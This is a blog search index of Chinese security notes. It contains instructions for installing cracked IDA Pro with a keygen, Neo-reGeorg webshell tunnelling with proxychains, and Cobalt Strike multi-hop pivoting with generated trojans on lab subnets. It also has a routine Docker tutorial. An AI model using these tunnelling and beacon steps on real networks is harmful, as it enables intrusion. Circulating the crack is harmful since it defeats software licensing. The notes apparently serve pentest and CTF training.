<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>IDA及keypatch安装教程</title>
    <url>/2023/09/12/IDA%E5%8F%8Akeypatch%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/</url>
    <content><![CDATA[<p>IDA版本：ida7.7sp1</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">ida77sp1.exe</span><br><span class="line">https<span class="punctuation">:</span><span class="comment">//www.aliyundrive.com/s/mMWi6kUfxkR</span></span><br><span class="line">提取码<span class="punctuation">:</span> o85t</span><br><span class="line">点击链接保存，或者复制本段内容，打开「阿里云盘」APP ，无需下载极速在线查看，视频原画倍速播放。</span><br></pre></td></tr></table></figure>

<p>python版本：Python 3.10.1（Python3.11环境keypatch无效）</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">python<span class="number">-3.10</span><span class="number">.1</span>-amd64.exe</span><br><span class="line">https<span class="punctuation">:</span><span class="comment">//www.aliyundrive.com/s/wfKWpp2KBbQ</span></span><br><span class="line">提取码<span class="punctuation">:</span> <span class="number">41</span>la</span><br><span class="line">点击链接保存，或者复制本段内容，打开「阿里云盘」APP ，无需下载极速在线查看，视频原画倍速播放。</span><br></pre></td></tr></table></figure>

<h1 id="IDA破解安装"><a href="#IDA破解安装" class="headerlink" title="IDA破解安装"></a>IDA破解安装</h1><p>ida程序的文件名为x64_idapronw_hexarm64w_hexarmw_hexmipsw_hexppc64w_hexppcw_hexx64w_hexx86w_220118</p>
<p>先解压这个文件</p>
<p>要对ida进行破解，将\ida77sp1\Crack_v2\IDA 7.7 Keygen里面的所有文件复制</p>
<p><img src="/2023/09/12/IDA%E5%8F%8Akeypatch%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/1694526738500-24.png" alt="img"></p>
<p>粘贴到ida根目录下替换，运行idakeycmd即可完成破解安装</p>
<p><img src="/2023/09/12/IDA%E5%8F%8Akeypatch%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/1694526738498-19.png" alt="img"></p>
<h1 id="keypatch安装"><a href="#keypatch安装" class="headerlink" title="keypatch安装"></a>keypatch安装</h1><p>python需要安装这两个库</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">pip install keystone-engine</span><br><span class="line">pip install six</span><br></pre></td></tr></table></figure>

<p>解压keypatch-master将里面文件（主要是keypatch.py）粘贴到plugins</p>
<p><img src="/2023/09/12/IDA%E5%8F%8Akeypatch%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/1694526738498-20.png" alt="img"></p>
<p>确保plugins文件下有keypatch.py</p>
<p><img src="/2023/09/12/IDA%E5%8F%8Akeypatch%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/1694526738499-21.png" alt="img"></p>
<p>之后keypatch就可以使用了</p>
<p><img src="/2023/09/12/IDA%E5%8F%8Akeypatch%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/1694526738499-22.png" alt="img"></p>
<p><img src="/2023/09/12/IDA%E5%8F%8Akeypatch%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/1694526738499-23.png" alt="img"></p>
]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>awd</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>Neo-reGeorg隧道</title>
    <url>/2023/08/03/Neo-reGeorg%E9%9A%A7%E9%81%93/</url>
    <content><![CDATA[<p>Neo-reGeorg下载地址: <a href="https://github.com/L-codes/Neo-reGeorg">https://github.com/L-codes/Neo-reGeorg</a></p>
<p>生成后面脚本</p>
<p>python neoreg.py generate -k password</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python neoreg.py generate -k <span class="number">123456</span></span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/03/Neo-reGeorg%E9%9A%A7%E9%81%93/1691076495435-18.png" alt="img"></p>
<p>生成的文件在neoreg_servers&#x2F;路径下</p>
<p><img src="/2023/08/03/Neo-reGeorg%E9%9A%A7%E9%81%93/1691076495436-19.png" alt="img"></p>
<p>上传到目标的服务器上</p>
<p>python3 neoreg.py -k password -u <a href="http://xx/tunnel.php">http://xx/tunnel.php</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python neoreg.py -k <span class="number">123456</span> -u http://<span class="number">192.168</span><span class="number">.112</span><span class="number">.132</span>/tunnel.php</span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/03/Neo-reGeorg%E9%9A%A7%E9%81%93/1691076495436-20.png" alt="img"></p>
<p>隧道我socks5</p>
<p>下面进行proxychains的设置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/proxychains4.conf</span><br></pre></td></tr></table></figure>

<p>使用nmap进行测试</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">proxychains nmap -sT -Pn -p <span class="number">80</span> <span class="number">192.168</span><span class="number">.52</span><span class="number">.138</span> </span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/03/Neo-reGeorg%E9%9A%A7%E9%81%93/1691076495436-21.png" alt="img"></p>
<p><img src="/2023/08/03/Neo-reGeorg%E9%9A%A7%E9%81%93/1691076495436-22.png" alt="img"></p>
]]></content>
      <tags>
        <tag>web</tag>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>CS多层内网渗透转发上线</title>
    <url>/2023/08/03/CS%E5%A4%9A%E5%B1%82%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E8%BD%AC%E5%8F%91%E4%B8%8A%E7%BA%BF/</url>
    <content><![CDATA[<h3 id="PC1转发上线PC2"><a href="#PC1转发上线PC2" class="headerlink" title="PC1转发上线PC2"></a>PC1转发上线PC2</h3><p>假设我们拿下了PC1的权限</p>
<p>查看ip</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">以太网适配器 Ethernet0:</span><br><span class="line"></span><br><span class="line">   连接特定的 DNS 后缀 . . . . . . . : </span><br><span class="line">   本地链接 IPv6 地址. . . . . . . . : fe80::9886:31c3:d457:35de%14</span><br><span class="line">   IPv4 地址 . . . . . . . . . . . . : 192.168.52.30</span><br><span class="line">   子网掩码  . . . . . . . . . . . . : 255.255.255.0</span><br><span class="line">   默认网关. . . . . . . . . . . . . : 192.168.52.254</span><br><span class="line"></span><br><span class="line">以太网适配器 Ethernet1:</span><br><span class="line"></span><br><span class="line">   连接特定的 DNS 后缀 . . . . . . . : </span><br><span class="line">   本地链接 IPv6 地址. . . . . . . . : fe80::1505:4583:2e77:e7b2%7</span><br><span class="line">   IPv4 地址 . . . . . . . . . . . . : 192.168.54.40</span><br><span class="line">   子网掩码  . . . . . . . . . . . . : 255.255.255.0</span><br><span class="line">   默认网关. . . . . . . . . . . . . : 192.168.54.254</span><br></pre></td></tr></table></figure>

<p>假设我们也通过信息收集知到54网段有其他主机并且通过漏洞拿下了，现在我们去转发上线</p>
<p>我们此时需要内网的ip进行转发上线</p>
<p><img src="/2023/08/03/CS%E5%A4%9A%E5%B1%82%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E8%BD%AC%E5%8F%91%E4%B8%8A%E7%BA%BF/1691051667697-14.png" alt="img"></p>
<p><img src="/2023/08/03/CS%E5%A4%9A%E5%B1%82%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E8%BD%AC%E5%8F%91%E4%B8%8A%E7%BA%BF/1691051667696-1.png" alt="img"></p>
<p>生成木马</p>
<p><img src="/2023/08/03/CS%E5%A4%9A%E5%B1%82%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E8%BD%AC%E5%8F%91%E4%B8%8A%E7%BA%BF/1691051667696-2.png" alt="img"></p>
<p><img src="/2023/08/03/CS%E5%A4%9A%E5%B1%82%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E8%BD%AC%E5%8F%91%E4%B8%8A%E7%BA%BF/1691051667696-3.png" alt="img"></p>
<p>起名为52.exe代表内网的52网段，在52网段的目标主机运行</p>
<p><img src="/2023/08/03/CS%E5%A4%9A%E5%B1%82%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E8%BD%AC%E5%8F%91%E4%B8%8A%E7%BA%BF/1691051667696-4.png" alt="img"></p>
<p><img src="/2023/08/03/CS%E5%A4%9A%E5%B1%82%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E8%BD%AC%E5%8F%91%E4%B8%8A%E7%BA%BF/1691051667696-5.png" alt="img"></p>
<h3 id="PC2转发上线PC3"><a href="#PC2转发上线PC3" class="headerlink" title="PC2转发上线PC3"></a>PC2转发上线PC3</h3><p>同理也进行了信息收集拿下了54网段的主机</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">以太网适配器 Ethernet0:</span><br><span class="line"></span><br><span class="line">   连接特定的 DNS 后缀 . . . . . . . : </span><br><span class="line">   本地链接 IPv6 地址. . . . . . . . : fe80::9886:31c3:d457:35de%14</span><br><span class="line">   IPv4 地址 . . . . . . . . . . . . : 192.168.52.30</span><br><span class="line">   子网掩码  . . . . . . . . . . . . : 255.255.255.0</span><br><span class="line">   默认网关. . . . . . . . . . . . . : 192.168.52.254</span><br><span class="line"></span><br><span class="line">以太网适配器 Ethernet1:</span><br><span class="line"></span><br><span class="line">   连接特定的 DNS 后缀 . . . . . . . : </span><br><span class="line">   本地链接 IPv6 地址. . . . . . . . : fe80::1505:4583:2e77:e7b2%7</span><br><span class="line">   IPv4 地址 . . . . . . . . . . . . : 192.168.54.40</span><br><span class="line">   子网掩码  . . . . . . . . . . . . : 255.255.255.0</span><br><span class="line">   默认网关. . . . . . . . . . . . . : 192.168.54.254</span><br></pre></td></tr></table></figure>

<p>在listen host填写下一级的内网ip</p>
<p><img src="/2023/08/03/CS%E5%A4%9A%E5%B1%82%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E8%BD%AC%E5%8F%91%E4%B8%8A%E7%BA%BF/1691051667696-6.png" alt="img"></p>
<p>生成木马</p>
<p><img src="/2023/08/03/CS%E5%A4%9A%E5%B1%82%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E8%BD%AC%E5%8F%91%E4%B8%8A%E7%BA%BF/1691051667696-7.png" alt="img"></p>
<p>起名54.exe 在目标主机运行</p>
<p><img src="/2023/08/03/CS%E5%A4%9A%E5%B1%82%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E8%BD%AC%E5%8F%91%E4%B8%8A%E7%BA%BF/1691051667696-8.png" alt="img"></p>
<p>上线成功</p>
<h2 id="如何正向连接？"><a href="#如何正向连接？" class="headerlink" title="如何正向连接？"></a>如何正向连接？</h2><p>新增监听器如图所示注意payload为beacon tcp</p>
<p><img src="/2023/08/03/CS%E5%A4%9A%E5%B1%82%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E8%BD%AC%E5%8F%91%E4%B8%8A%E7%BA%BF/1691051667696-9.png" alt="img"></p>
<p>还是生成无状态的木马</p>
<p><img src="/2023/08/03/CS%E5%A4%9A%E5%B1%82%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E8%BD%AC%E5%8F%91%E4%B8%8A%E7%BA%BF/1691051667696-10.png" alt="img"></p>
<p>目标内网</p>
<p>这里是通过PC2上线PC3所以填的是PC2 和PC3相同的网段ip即192.168.54.50</p>
<p>cs输入 connect 运行正向马的ip 你监听器设置的端口</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">connect 192.168.54.50 8888</span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/03/CS%E5%A4%9A%E5%B1%82%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E8%BD%AC%E5%8F%91%E4%B8%8A%E7%BA%BF/1691051667696-11.png" alt="img"></p>
<p><img src="/2023/08/03/CS%E5%A4%9A%E5%B1%82%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E8%BD%AC%E5%8F%91%E4%B8%8A%E7%BA%BF/1691051667696-12.png" alt="img"></p>
<p>后面重新打了下</p>
<h3 id="正向连接上线PC4"><a href="#正向连接上线PC4" class="headerlink" title="正向连接上线PC4"></a>正向连接上线PC4</h3><p><img src="/2023/08/03/CS%E5%A4%9A%E5%B1%82%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E8%BD%AC%E5%8F%91%E4%B8%8A%E7%BA%BF/1691051667696-13.png" alt="img"></p>
<p>后面依次类推</p>
]]></content>
      <tags>
        <tag>web</tag>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>docker</title>
    <url>/2023/08/03/docker/</url>
    <content><![CDATA[<p>下载链接：<a href="https://www.docker.com/">https://www.docker.com/</a></p>
<p>参考链接：<a href="https://blog.csdn.net/weixin_45043334/article/details/125243499">https://blog.csdn.net/weixin_45043334/article/details/125243499</a></p>
<p>解决WARNING: IPv4 forwarding is disabled. Networking will not work.报错问题</p>
<p>在vi &#x2F;etc&#x2F;sysctl.conf时添加下面内容</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@localhost ]<span class="comment"># vi /etc/sysctl.conf</span></span><br><span class="line">net.ipv4.ip_forward=1</span><br><span class="line">[root@localhost ]<span class="comment"># systemctl restart network</span></span><br><span class="line">[root@localhost ]<span class="comment"># sysctl net.ipv4.ip_forward</span></span><br><span class="line">net.ipv4.ip_forward = 1</span><br><span class="line">[root@localhost ]<span class="comment"># </span></span><br></pre></td></tr></table></figure>

<h2 id="docker-pull下载镜像"><a href="#docker-pull下载镜像" class="headerlink" title="docker pull下载镜像"></a>docker pull下载镜像</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#下载镜像 docker pull 镜像名 [:tag][root@VM-16-15-centos ~]</span></span><br><span class="line"><span class="comment"># docker pull mysql</span></span><br><span class="line">Using default tag: latest                     <span class="comment">#如果不写 tag.默认就是 latest</span></span><br><span class="line">latest: Pulling from library/mysql</span><br><span class="line">72a69066d2fe: Pull complete                   <span class="comment">#分层下载，docker images的核心,联合文件系统</span></span><br><span class="line">93619dbc5b36: Pull complete </span><br><span class="line">99da31dd6142: Pull complete </span><br><span class="line">626033c43d70: Pull complete </span><br><span class="line">37d5d7efb64e: Pull complete </span><br><span class="line">ac563158d721: Pull complete </span><br><span class="line">d2ba16033dad: Pull complete </span><br><span class="line">688ba7d5c01a: Pull complete </span><br><span class="line">00e060b6d11d: Pull complete </span><br><span class="line">1c04857f594f: Pull complete </span><br><span class="line">4d7cfa90e6ea: Pull complete </span><br><span class="line">e0431212d27d: Pull complete </span><br><span class="line">Digest: sha256:e9027fe4d91c0153429607251656806cc784e914937271037f7738bd5b8e7709</span><br><span class="line">Status: Downloaded newer image <span class="keyword">for</span> mysql:latest</span><br><span class="line">docker.io/library/mysql:latest               <span class="comment">#真实地址#等价于docker pull mysql</span></span><br><span class="line">docker pull docker.io/library/mysql:latest</span><br><span class="line"></span><br><span class="line"><span class="comment">#指定版本下载[root@VM-16-15-centos ~]# docker pull mysql:5.75.7: Pulling from library/mysql</span></span><br><span class="line">72a69066d2fe: Already exists </span><br><span class="line">93619dbc5b36: Already exists </span><br><span class="line">99da31dd6142: Already exists </span><br><span class="line">626033c43d70: Already exists </span><br><span class="line">37d5d7efb64e: Already exists </span><br><span class="line">ac563158d721: Already exists </span><br><span class="line">d2ba16033dad: Already exists </span><br><span class="line">0ceb82207cd7: Pull complete </span><br><span class="line">37f2405cae96: Pull complete </span><br><span class="line">e2482e017e53: Pull complete </span><br><span class="line">70deed891d42: Pull complete </span><br><span class="line">Digest: sha256:f2ad209efe9c67104167fc609cca6973c8422939491c9345270175a300419f94</span><br><span class="line">Status: Downloaded newer image <span class="keyword">for</span> mysql:5.7</span><br><span class="line">docker.io/library/mysql:5.7</span><br></pre></td></tr></table></figure>

<h2 id="docker-search-搜索镜像"><a href="#docker-search-搜索镜像" class="headerlink" title="docker search 搜索镜像"></a><strong>docker search 搜索镜像</strong></h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@VM-16-15-centos ~]<span class="comment"># docker search mysql</span></span><br><span class="line">NAME                           DESCRIPTION                                     STARS     OFFICIAL   AUTOMATED</span><br><span class="line">mysql                          MySQL is a widely used, open-source relation…   12714     [OK]       </span><br><span class="line">mariadb                        MariaDB Server is a high performing open sou…   4882      [OK]       </span><br><span class="line">percona                        Percona Server is a fork of the MySQL relati…   579       [OK]   </span><br><span class="line"></span><br><span class="line"><span class="comment">#可选项</span></span><br><span class="line">--filter=STARS=3000      <span class="comment">#搜索出来的镜像就是STARS大于3000的</span></span><br><span class="line"></span><br><span class="line">[root@VM-16-15-centos ~]<span class="comment"># docker search mysql --filter=STARS=3000 </span></span><br><span class="line">NAME      DESCRIPTION                                     STARS     OFFICIAL   AUTOMATED</span><br><span class="line">mysql     MySQL is a widely used, open-source relation…   12714     [OK]       </span><br><span class="line">mariadb   MariaDB Server is a high performing open sou…   4882      [OK]    </span><br><span class="line"></span><br><span class="line">[root@VM-16-15-centos ~]<span class="comment"># docker search mysql --filter=STARS=5000</span></span><br><span class="line">NAME      DESCRIPTION                                     STARS     OFFICIAL   AUTOMATED</span><br><span class="line">mysql     MySQL is a widely used, open-source relation…   12714     [OK]  </span><br></pre></td></tr></table></figure>

<p><strong>我们有了镜像才可以创建容器，Linux，下载一个centos镜像来测试学习</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker pull centos</span><br></pre></td></tr></table></figure>

<h2 id="新建容器并启动"><a href="#新建容器并启动" class="headerlink" title="新建容器并启动"></a><strong>新建容器并启动</strong></h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run [可选参数] image</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">参数说明</span></span><br><span class="line">--name=&quot;名字&quot;           指定容器名字</span><br><span class="line">-d                     后台方式运行</span><br><span class="line">-it                    使用交互方式运行,进入容器查看内容</span><br><span class="line">-p                     指定容器的端口</span><br><span class="line">            (</span><br><span class="line">            -p ip:主机端口:容器端口  配置主机端口映射到容器端口</span><br><span class="line">            -p 主机端口:容器端口</span><br><span class="line">            -p 容器端口</span><br><span class="line">            )</span><br><span class="line">-P                     随机指定端口(大写的P)</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">测试，启动进入容器</span></span><br><span class="line">[root@VM-16-15-centos ~]# docker run -it centos /bin/bash</span><br><span class="line">[root@5fb5b6532790 /]# ls             </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看容器内的centos发现和外部的一样，但是这俩个没关系（容器内部的centos是基础版本，很多命令都是不完善的）</span>           </span><br><span class="line">bin  dev  etc  home  lib  lib64  lost+found  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">从容器中退回到主机</span></span><br><span class="line">[root@5fb5b6532790 /]# exitexit[root@VM-16-15-centos /]# ls</span><br><span class="line">bin  boot  data  dev  etc  home  lib  lib64  lost+found  media  mnt  opt  patch  proc  root  run  sbin  srv  sys  tmp  usr  var  www</span><br></pre></td></tr></table></figure>

<h2 id="退出容器"><a href="#退出容器" class="headerlink" title="退出容器"></a><strong>退出容器</strong></h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">exit         #直接容器停止退出</span><br><span class="line">Ctrl + P + Q #容器不停止退出</span><br></pre></td></tr></table></figure>

<h2 id="删除容器"><a href="#删除容器" class="headerlink" title="删除容器"></a><strong>删除容器</strong></h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker rm 容器id              </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">删除指定的容器，不能删除正在运行的容器，如果要强制删除 <span class="built_in">rm</span> -fdocker <span class="built_in">rm</span> -f $(docker ps -aq)</span>      </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">删除所有的容器docker ps -a -q | xargs docker <span class="built_in">rm</span>  <span class="comment">#删除所有的容器</span></span></span><br></pre></td></tr></table></figure>

<h2 id="启动和停止容器的操作"><a href="#启动和停止容器的操作" class="headerlink" title="启动和停止容器的操作"></a><strong>启动和停止容器的操作</strong></h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker start 容器id          </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">启动容器docker restart 容器<span class="built_in">id</span></span>        </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">重启容器docker stop  容器<span class="built_in">id</span></span>          </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">停止当前正在运行的容器docker <span class="built_in">kill</span> 容器<span class="built_in">id</span></span>           </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">强制停止当前的容器</span></span><br></pre></td></tr></table></figure>

<h2 id="查看"><a href="#查看" class="headerlink" title="查看"></a>查看</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">sudo docker ps -a</span><br></pre></td></tr></table></figure>

<p>查看元数据</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#命令</span></span><br><span class="line">docker inspect 容器<span class="built_in">id</span></span><br></pre></td></tr></table></figure>

<h2 id="进入当前正在运行的容器"><a href="#进入当前正在运行的容器" class="headerlink" title="进入当前正在运行的容器"></a><strong>进入当前正在运行的容器</strong></h2><p>因为通常我们的容器都是使用后台方式来运行的，有时需要进入容器修改配置</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#命令</span></span><br><span class="line">docker <span class="built_in">exec</span> -it 容器<span class="built_in">id</span> bashshell</span><br><span class="line"><span class="comment">#测试</span></span><br><span class="line">[root@VM-16-15-centos ~]<span class="comment"># docker ps</span></span><br><span class="line">CONTAINER ID   IMAGE     COMMAND                  CREATED       STATUS       PORTS     NAMES</span><br><span class="line">0572cf30f11a   centos    <span class="string">&quot;/bin/sh -c &#x27;while t…&quot;</span>   4 hours ago   Up 4 hours             zen_heisenberg</span><br><span class="line"></span><br><span class="line">[root@VM-16-15-centos ~]<span class="comment"># docker exec -it 0572cf30f11a  /bin/bash</span></span><br><span class="line">[root@0572cf30f11a /]<span class="comment"># ls</span></span><br><span class="line">bin  dev  etc  home  lib  lib64  lost+found  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var</span><br><span class="line"></span><br><span class="line">[root@0572cf30f11a /]<span class="comment"># ps -ef</span></span><br><span class="line">UID          PID    PPID  C STIME TTY          TIME CMD</span><br><span class="line">root           1       0  0 03:14 ?        00:00:00 /bin/sh -c <span class="keyword">while</span> <span class="literal">true</span>;<span class="keyword">do</span> <span class="built_in">echo</span> dainaiao;<span class="built_in">sleep</span> 5;<span class="keyword">done</span></span><br><span class="line">root        2715       0  0 06:59 pts/0    00:00:00 /bin/bash</span><br><span class="line">root        2731       1  0 06:59 ?        00:00:00 /usr/bin/coreutils --coreutils-prog-shebang=<span class="built_in">sleep</span> /usr/bin/sleep 5</span><br><span class="line">root        2732    2715  0 06:59 pts/0    00:00:00 ps -ef</span><br></pre></td></tr></table></figure>

<ul>
<li>方式2</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker attach 容器id</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">测试[root@VM-16-15-centos ~]<span class="comment"># docker attach 0572cf30f11a</span></span> </span><br><span class="line">正在执行当前的代码...</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">docker <span class="built_in">exec</span>     <span class="comment">#进入容器后开启一个新的容器，可以在里面操作（常用）</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">docker attach   <span class="comment">#进入容器正在执行的终端，不会启动新的进程！</span></span></span><br></pre></td></tr></table></figure>

<h2 id="拷贝操作"><a href="#拷贝操作" class="headerlink" title="拷贝操作"></a><strong>拷贝操作</strong></h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">拷贝容器的文件到主机中docker <span class="built_in">cp</span> 容器<span class="built_in">id</span>:容器内路径  目的主机路径</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">拷贝宿主机的文件到容器中docker <span class="built_in">cp</span> 目的主机路径 容器<span class="built_in">id</span>:容器内路径</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看当前主机目录下[root@VM-16-15-centos home]<span class="comment"># ls</span></span></span><br><span class="line">dainiao.java  lighthouse  www</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">进入docker容器内部[root@VM-16-15-centos home]<span class="comment"># docker attach 89a99696cd86 [root@89a99696cd86 /]# cd /home#在容器内创创建一个文件</span></span></span><br><span class="line">[root@89a99696cd86 home]# touch test.java</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">退出容器[root@89a99696cd86 home]<span class="comment"># exit exit[root@VM-16-15-centos home]</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">docker ps</span></span><br><span class="line">CONTAINER ID   IMAGE     COMMAND   CREATED   STATUS    PORTS     NAMES</span><br><span class="line">[root@VM-16-15-centos home]# docker ps -a</span><br><span class="line">CONTAINER ID   IMAGE     COMMAND       CREATED         STATUS                      PORTS     NAMES</span><br><span class="line">89a99696cd86   centos    &quot;/bin/bash&quot;   2 minutes ago   Exited (0) 10 seconds ago             cranky_aryabhata</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">将文件从容器中拷贝到主机上</span></span><br><span class="line">[root@VM-16-15-centos home]# docker cp 89a99696cd86:/home/test.java /home</span><br><span class="line">[root@VM-16-15-centos home]# ls</span><br><span class="line">dainiao.java  lighthouse  test.java  www</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">拷贝是一个手动过程，未来我们使用 -v 卷的技术，可以实现自动同步（将主机的home和容器的home联系在一起）</span></span><br></pre></td></tr></table></figure>

<h2 id="命令小结"><a href="#命令小结" class="headerlink" title="命令小结"></a>命令小结</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">attach    Attach to a running container                 # 当前 shell 下 attach 连接指定运行镜像</span><br><span class="line">build     Build an image from a Dockerfile              # 通过 Dockerfile 定制镜像</span><br><span class="line">commit    Create a new image from a container changes   # 提交当前容器为新的镜像cp        Copy files/folders from the containers filesystem to the host path   #从容器中拷贝指定文件或者目录到宿主机中</span><br><span class="line">create    Create a new container                        # 创建一个新的容器，同 run，但不启动容器diff      Inspect changes on a container&#x27;s filesystem   # 查看 docker 容器变化</span><br><span class="line">events    Get real time events from the server          # 从 docker 服务获取容器实时事件exec      Run a command in an existing container        # 在已存在的容器上运行命令export    Stream the contents of a container as a tar archive   # 导出容器的内容流作为一个 tar 归档文件[对应 import ]history   Show the history of an image                  # 展示一个镜像形成历史</span><br><span class="line">images    List images                                   # 列出系统当前镜像import    Create a new filesystem image from the contents of a tarball # 从tar包中的内容创建一个新的文件系统映像[对应export]</span><br><span class="line">info      Display system-wide information               # 显示系统相关信息</span><br><span class="line">inspect   Return low-level information on a container   # 查看容器详细信息kill      Kill a running container                      # kill 指定 docker 容器</span><br><span class="line">load      Load an image from a tar archive              # 从一个 tar 包中加载一个镜像[对应 save]</span><br><span class="line">login     Register or Login to the docker registry server    # 注册或者登陆一个 docker 源服务器logout    Log out from a Docker registry server          # 从当前 Docker registry 退出</span><br><span class="line">logs      Fetch the logs of a container                 # 输出当前容器日志信息</span><br><span class="line">port      Lookup the public-facing port which is NAT-ed to PRIVATE_PORT    # 查看映射端口对应的容器内部源端口</span><br><span class="line">pause     Pause all processes within a container        # 暂停容器ps        List containers                               # 列出容器列表</span><br><span class="line">pull      Pull an image or a repository from the docker registry server   # 从docker镜像源服务器拉取指定镜像或者库镜像</span><br><span class="line">push      Push an image or a repository to the docker registry server    # 推送指定镜像或者库镜像至docker源服务器</span><br><span class="line">restart   Restart a running container                   # 重启运行的容器rm        Remove one or more containers                 # 移除一个或者多个容器</span><br><span class="line">rmi       Remove one or more images             # 移除一个或多个镜像[无容器使用该镜像才可删除，否则需删除相关容器才可继续或 -f 强制删除]</span><br><span class="line">run       Run a command in a new container              # 创建一个新的容器并运行一个命令</span><br><span class="line">save      Save an image to a tar archive                # 保存一个镜像为一个 tar 包[对应 load]</span><br><span class="line">search    Search for an image on the Docker Hub         # 在 docker hub 中搜索镜像</span><br><span class="line">start     Start a stopped containers                    # 启动容器</span><br><span class="line">stop      Stop a running containers                     # 停止容器</span><br><span class="line">tag       Tag an image into a repository                # 给源中镜像打标签top       Lookup the running processes of a container   # 查看容器中运行的进程信息</span><br><span class="line">unpause   Unpause a paused container                    # 取消暂停容器</span><br><span class="line">version   Show the docker version information           # 查看 docker 版本号wait      Block until a container stops, then print its exit code   # 截取容器停止时的退出状态值</span><br></pre></td></tr></table></figure>

<p>docker卸载删除</p>
<p><a href="https://www.cnblogs.com/shmily3929/p/12085163.html">https://www.cnblogs.com/shmily3929/p/12085163.html</a></p>
<h2 id="docker更换加速源"><a href="#docker更换加速源" class="headerlink" title="docker更换加速源"></a>docker更换加速源</h2><h3 id="1-修改镜像地址"><a href="#1-修改镜像地址" class="headerlink" title="1.修改镜像地址"></a>1.修改镜像地址</h3><p>修改&#x2F;etc&#x2F;docker&#x2F;daemon.json（如果没有则新建此文件）</p>
<p>内容如下：</p>
